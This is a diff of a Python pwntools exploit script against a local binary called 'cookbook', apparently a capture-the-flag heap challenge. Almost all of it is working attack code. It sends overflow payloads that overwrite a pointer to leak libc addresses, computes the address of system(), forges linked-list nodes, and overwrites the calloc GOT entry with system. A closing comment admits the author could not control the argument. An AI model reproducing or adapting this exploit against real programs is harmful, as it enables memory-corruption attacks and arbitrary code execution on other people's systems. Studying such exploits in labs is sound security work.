@@ -8,7 +8,7 @@
 from pwn import *
 import re
 
-r = process('./cookbook')
+r = process('./cookbook', aslr=False)
 b = ELF('./cookbook')
 libc = ELF('/lib/i386-linux-gnu/libc.so.6')
 
@@ -16,42 +16,152 @@ def s(msg):
     r.send(msg + '\n')
 
 if __name__ == "__main__":
-    print r.recvuntil("what's your name?")
+    r.recvuntil("what's your name?")
     s('babo')
 
-    print r.recvuntil('[q]uit\n')
+    #
+    # leak LIBC
+    #
     s('c')
-    print r.recvuntil('[q]uit\n')
-    s('n')
-    print r.recvuntil('[q]uit\n')
-    s('d')
-    print r.recvuntil('[q]uit\n')
+    s('n') # malloc()
+    s('d') # free()
     s('q')
 
-    print r.recvuntil('[q]uit\n')
+    r.recv()
+
     s('a')
-    print r.recvuntil("[e]xport saving changes (doesn't quit)?\n")
-    s('n')
-    print r.recvuntil("[e]xport saving changes (doesn't quit)?\n")
+    s('n') # malloc()
     s('g')
-    s('A' * 116 + p32(0x804d030))
-    print r.recvuntil("[e]xport saving changes (doesn't quit)?\n")
+    s('A' * 116 + p32(b.got['puts']))
     s('q')
     
-    print r.recvuntil('[q]uit\n')
     s('c')
-    print r.recvuntil('[q]uit\n')
+    r.recv()
     s('p')
     resp = r.recvuntil('[q]uit\n')
+    s('q')
+    r.recv()
 
-    print resp
-    
     PUTS_ADDR = u32(re.findall(r"recipe type: (.+)", resp)[0][:4])
     LIBC_BASE = PUTS_ADDR - libc.symbols['puts']
-    SYSTEM_ADDR = LIBC_BASE + libc.symbols['system']
-
     log.info('LIBC_BASE: 0x%x' % LIBC_BASE)
+    SYSTEM_ADDR = LIBC_BASE + libc.symbols['system']
     log.info('SYSTEM_ADDR: 0x%x' % SYSTEM_ADDR)
 
-    pause()
+    #
+    # [2] leak 0x804d0a0
+    #
+    s('a')
+    s('g')
+    s('A' * 116 + p32(0x804d0a0))
+    s('q')
 
+    s('c')
+    r.recv()
+    s('p')
+    resp = r.recvuntil('[q]uit\n')
+    s('q')
+    r.recv()
+
+    CURRENT_RECIPE = u32(re.findall(r"recipe type: (.+)", resp)[0][:4])
+    log.info('CURRENT_RECIPE: 0x%x' % CURRENT_RECIPE)
+
+    #
+    # add node to the list 
+    #
+    #
+    # [listhead] [listhead] [name]
+    # 0          4          140
+    s('c')
+    s('a')
+    s('water')      # list_add(CURRENT_RECIPE, find_ingredient("water")
+    s('1')          # list_add(CURRENT_RECIPE + 4, 1)
+    
+    s('a')          
+    s('corn')       # list_add(CURRENT_RECIPE, find_ingredient("corn")
+    s('1')          # list_add(CURRENT_RECIPE + 4, 1)
+
+    s('a')          
+    s('tomato')     # list_add(CURRENT_RECIPE, find_ingredient("tomato")
+    s('1')          # list_add(CURRENT_RECIPE + 4, 1)
+    s('q')
+    r.recv()
+
+    raw_input('after adding 3 ingredients...')
+
+    #
+    # leak
+    #
+    s('a')
+    s('g')
+    s('A'*116 + p32(CURRENT_RECIPE))
+    s('q')
+
+    s('c')
+    r.recv()
+    s('p')
+    resp = r.recvuntil('[q]uit\n')
+    s('q')
+    r.recv()
+    
+    ORIGINAL_PTR = u32(re.findall(r"recipe type: (.+)", resp)[0][:4])
+    log.info('ORIGINAL_PTR: 0x%x' % ORIGINAL_PTR)
+
+    raw_input('after leaking...') 
+
+    #
+    # [5] make the fake second node
+    #
+    raw_input('[5] go?')
+    s('a')
+    s('n')
+    s('s')
+    #s(str(ORIGINAL_PTR))
+    s(str(0))
+    s('p')
+    s(str(b.got['calloc']))
+    s('q')
+    r.recv()
+
+    #
+    # [6] overwrite the first node to 0x804d098
+    #
+    raw_input('[6] go?')
+    s('c')
+    s('d')
+    s('q')
+    s('g')
+    s('f')
+    s(p32(ORIGINAL_PTR)+p32(0x804d098)+'\x00')
+    r.recv()
+
+    #
+    # [7] free the second node
+    # 
+    raw_input('[7] go?')
+    s('c')
+    s('r')
+    s('corn\x00')
+    s('q')
+
+    #
+    # [8] overwrite calloc@got
+    #
+    raw_input('[8] go?')
+    s('a')
+    s('s')
+    s(str(SYSTEM_ADDR))
+    s('q')
+    r.recv()
+
+    #
+    # [9] trigger
+    #
+    raw_input('[9] go?')
+    s('c')
+    s('n')
+
+    #
+    # was able to overwrite calloc@got with system(), but couldn't control it's argument.
+    #
+    r.interactive()
